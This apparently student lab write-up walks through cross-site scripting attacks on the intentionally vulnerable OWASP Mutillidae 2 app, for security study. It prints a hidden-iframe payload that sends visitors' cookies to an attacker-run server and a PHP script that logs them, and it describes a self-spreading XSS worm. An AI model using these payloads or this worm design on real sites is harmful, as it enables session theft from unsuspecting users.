# XSS-Attack
Cross-Site Scripting Attack

#### Setup

We are going to work on a publicly available open-source vulnerable web application: OWASP Mutillidae 2. This application contains various web vulnerabilities
including XSS attack.  It is based on PHP and MySQL and part of the OWASP
(Open Web Application Security Project). You need to download OWASP Virtual
Machine to obtain OWASP Mutillidae 2. The virtual machine can be downloaded
from [here](https://sourceforge.net/projects/owaspbwa/files/1.2/) and OWASP Mutillidae 2 can be run from any browser in Windows, Mac
or Linux

#### Alice adds to her blog an entry that contains a JavaScript code that shows
their cookies to the users who visit her blog
Here we added simple JavaScript code to print cookie of user who have just entered to see blog
posts of Alice.

#### Tcp and Web Server

We first tried to write simple tcp server in Java. We have used Server Socket to listen port and
accept data from sender. Operating System doesn't allow us to listen 6000 port. We have changed
that to 6001 in Java.
Buffered Reader was used to get input data from sender then File Writer writes data to cookies text
file. The second parameter of File Writer enables append function. We set true to append string
repeatedly to an existing file. There is a header list for header part of message and body string for
the body part. Data comes in two part separated by new line. If line is empty that means header part
of message has been sent and next part will be the body part of the message. Also all of these were
written in an infinite loop. That means server keeps accepting data until user closes program.

Web Server part of task actually was a little hard to implement in PHP than Java. First we have set
time limit to zero. Time limit is the number of seconds a script is allowed to run. Default limit is 30
seconds. Zero means no time limit specified. We have create socket using socket_create function.
AF_INET is IPV4 Internet based protocols. TCP and UDP are common protocols of this protocol
family. SOCK_STREAM provides reliable and full-duplex byte streams. TCP protocol is based on
this socket type. The last parameter in socket_create function is protocol. If the desired protocol is
TCP, or UDP the SOL_TCP and SOL_UDP can also be used. Socket_bind used to bind host and
port to socket. Socket_listen function has been used to listen incoming connections on socket.
Second parameter is backlog parameter that determines maximum of incoming connections will be
queued for processing. We have set this number to 3. If a request arrives with the queue full then
client may receive error message but if the protocol supports (underlying) retransmission, request
will be ignored so that retries may succeed. Socket_accept accepts connection on a socket. If there
are multiple connections on queue first connection on the queue will be accepted. Socket_read reads
data from incoming connection and returns data as a string. Second parameter determines length of
data that will be read by socket_read function. Trim function return a string that whitespace stripped
from beginning and end of string. Trim function also can strip characters such a tab, newline etc.
The last function is socket_close which closes the opened socket. (We cannot put it right after an
infinite loop in Java) We had a problem with printing output to web page as a table. So we have just
printed output to terminal. We could not receive data from incoming connection.

We have printed received data to terminal. Outputs of users who viewed Alice's blog.

#### Another PHP WebServer

Another way of using php webserver is using iframes instead of sockets. Attacker can post a
javascript code which creates an iframe, with source of our webserver. It can pass parameters (in
this scenario, cookies of the visitor) to webserver and if webserver saves them in a file, we can
effectively listen and log cookies of users at target webserver.

Example JS code which creates hidden iframe:

```
<script>document.write(\'<iframe src="http://localhost:8888/xss/index.php?
q=\'+escape(document.cookie)+\'" height=0 width=0 />\');</script>
```

And example php server, which collects and saves cookies:

```
<?php
$cookie = $_GET['q'];
$myfile = file_put_contents('cookies.txt', $cookie.PHP_EOL , FILE_APPEND);
?>
```

#### JavaScript (XSS Worm)

In this part, we have created an XSS Worm. Which means that, after first attacker posted it's
code, it affects any user that visited attacker's blog, and makes them another infecter.

It works like this:

Alice (Attacker), posts malicious code.
Bob (Innocent), visits Alice's blog and gets infected.
Dan (Innocent), visits Bob's (infected) blog and gets infected.
Eve (Innocent), visits Dan's (infected) blog and gets infected, etc.

Malicious code contains 2 parts.

First part, fetches malicious code from another webserver.
Second part, finds victim's session id and makes a request to “add-to-your-blog” page, using
victim's cookie. By this way, victim posts malicious code to his/her own blog.

Code at the webserver contains the same code which attacker used at first. Which means,
every user just replicates attacker's code to infect other visitors.

To make requests, we used xmlHttpRequest. To make them synchronous, code waits for the
first request (fetch malicious code from server), then makes second request (add malicious
code to target site).

To avoid conflicts, we added this header to our webserver.

`header("Access-Control-Allow-Origin: *");`

This code makes possible to send requests to the server from another domains.

